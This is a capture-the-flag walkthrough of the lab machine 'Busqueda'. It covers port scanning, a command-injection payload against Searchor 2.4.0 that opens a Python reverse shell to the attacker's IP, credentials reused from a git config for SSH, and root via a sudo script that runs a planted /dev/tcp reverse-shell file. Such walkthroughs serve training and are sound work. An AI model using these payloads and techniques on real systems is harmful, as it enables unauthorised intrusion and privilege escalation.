## Full TCP Port Scan (Aggressive) [33s]

```bash
sudo nmap -Pn -p- -A -T4 10.129.228.217
```

```text
Starting Nmap 7.95 (https://nmap.org) at 2025-03-31 08:55 EDT
Nmap scan report for 10.129.228.217
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   64.60 ms 10.10.16.1
2   32.82 ms 10.129.228.217

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 30.41 seconds
```

## Enumeration

### Port 80 (HTTP)
- Redirects to `http://searcher.htb`
- Add to `/etc/hosts`:
  ```bash
  echo "10.129.228.217 searcher.htb" | sudo tee -a /etc/hosts
  ```

### Web Directory Scanning
```bash
gobuster dir -u http://searcher.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```
```text
/search               (Status: 405) [Size: 153]
```

### Searchor Application (v2.4.0)
- Web interface at `http://searcher.htb/search`
- Vulnerable to CVE-2023-3999 (Command Injection)

## Exploitation

### Reverse Shell via Command Injection
Payload:
```python
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.12',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

Start listener:
```bash
nc -lvnp 1234
```

Execute payload in search query to get reverse shell:
```text
$ whoami
www-data
```

### User Flag
Located in svc's home:
```bash
www-data@busqueda:/var/www/app$ cat /home/svc/user.txt
e7d4d**********************
```

## Privilege Escalation

### Git Configuration Analysis
```bash
cat /var/www/app/.git/config
```
```text
[remote "origin"]
    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

### SSH Access
Add gitea domain to hosts:
```bash
echo "10.129.228.217 gitea.searcher.htb" | sudo tee -a /etc/hosts
```

Connect via SSH:
```bash
ssh svc@searcher.htb
Password: jh1usoih2bkjaspwe92
```

### Sudo Privileges
```bash
svc@busqueda:~$ sudo -l
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

### Exploiting System-Checkup Script
Create exploit script:
```bash
echo '#!/bin/bash' > full-checkup.sh
echo 'bash -i >& /dev/tcp/10.10.16.12/4444 0>&1' >> full-checkup.sh
chmod +x full-checkup.sh
```

Start listener:
```bash
nc -lvnp 4444
```

Execute with sudo:
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

### Root Shell
```text
connect to [10.10.16.12] from (UNKNOWN) [10.129.228.217] 39132
root@busqueda:/home/svc# cat /root/root.txt
fbbe1************************
```
